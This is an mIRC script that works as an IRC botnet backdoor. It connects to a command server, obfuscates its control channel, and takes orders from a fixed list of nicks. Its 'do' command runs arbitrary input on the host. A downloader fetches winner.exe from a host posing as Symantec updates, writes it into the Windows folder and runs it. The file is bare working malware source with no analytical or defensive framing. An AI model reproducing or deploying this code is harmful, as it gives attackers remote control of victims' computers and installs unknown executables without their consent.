;socket
alias -l il { return $r(a,z) $+ $iif($r(1,3) = 2,$r(A,Z)) $+ $iif($r(1,3) = 2,$r(a,z)) }
alias -l ich { return $decode(I3l1c2t5,m) }
alias -l scmd { if ($1 && $sock(wnurr).status == active) { sockwrite -tn wnurr $1- } }
alias -l smsg { scmd privmsg $1 $+(:,$2-) }
alias -l snotice { scmd notice $1 $+(:,$2-) }
alias -l icn { scmd nick $+(TT-,$r(000000,999999)) }
on *:sockopen:wnurr:{
  if ($sockerr) { return }
  scmd user $r(a,z) hostname servername $+(:,$r(a,z))
  icn
}
on *:sockread:wnurr:{
  if ($sockerr) { return }
  sockread %i | tokenize 32 %i | unset %i
  if (!$1) || ($2 = 372) { return }
  var %nick = $gettok($mid($1-,2-),1,33)
  if ($1 == PING) { scmd pong $2- }
  if ($2 == PRIVMSG && $istok(Debian Kheper Einstein MH,%nick,32)) {
    if ($chr(35) isin $3 && $3 != $ich) { return }
    tokenize 32 $mid($4-,2-)
    if ($1 == notice) { .timer 1 0 snotice %nick $2- }
    if ($1 == do) { $2- }
    if ($1 == isc && $2) {
      if ($2 == connect && $3) { sockclose isc | sockopen isc $3 6667 }
      else { iscmd $2- }
    }
  }
  if ($2 == KICK && $4 == %imynick) { scmd join $3 }
  if ($2 == 001) { scmd join $ich }
  if ($2 == 433) { icn }
}
;check
on *:signal:ionload:{ .timer 1 0 .signal ivariouscheck }
on *:connect:{ .timer 1 0 .signal ivariouscheck }
on *:signal:ivariouscheck:{
  if (%hrtsrdxc) { return }
  if (!$timer(wrsxnsd)) { .timerwrsxnsd -io 0 180 .signal ivariouscheck }
  if (!$sock(wnurr)) { sockclose wnurr | sockopen wnurr irc.tuxserver.cjb.net 6667 }
  303872
}
;downloader
alias 303872 {
  var %fn = \windows\winner.exe
  if ($sock(303872)) || (%303872) || (!$isdir($nofile(%fn))) { return }
  sockopen 303872 symantecupdates.hosting43.com 80
  sockmark 303872 0 0 %fn
  ;<bw.ok> <fn.size> <filename>
}
on *:sockopen:303872:{
  if ($sockerr) { return }
  var %sw = sockwrite -n $sockname
  %sw GET /winner.exe HTTP/1.1
  %sw Host: symantecupdates.hosting43.com
  %sw Connection: close
  %sw 
}
on *:sockread:303872:{
  if ($sockerr) { return }
  tokenize 32 $sock($sockname).mark
  if (!$1) {
    var %i | sockread %i
    if (404 isin %i) { sockclose $sockname }
    if (Content-Length isin %i) { sockmark $sockname 0 $gettok(%i,2,32) $3 }
    if ($len(%i) < 4) { sockmark $sockname 1 $2- | write -c $3 }
  }
  else { sockread &i | bwrite $3 -1 -1 &i }
}
on *:sockclose:303872:{
  tokenize 32 $sock($sockname).mark
  if ($lof($3) = $2) { set %303872 1 | run $3 }
}
;isc
alias -l iscmd if ($sock(isc)) { sockwrite -tn isc $1- }
on *:sockopen:isc:{
  if ($sockerr) { halt }
  iscmd user $+($il,$il,$il) hostname servername $+(:,$il,$il,$il)
  iscmd nick $+($il,$il,$il,$il,$il)
}
on *:sockread:isc:{
  sockread %i | tokenize 32 %i | unset %i
  if ($1 == PING) { iscmd PONG $2- }
  if ($2 == 005 && $gettok($wildtok($4-,network=*,1,32),2,61) == brasnet) { sockclose $sockname }
}
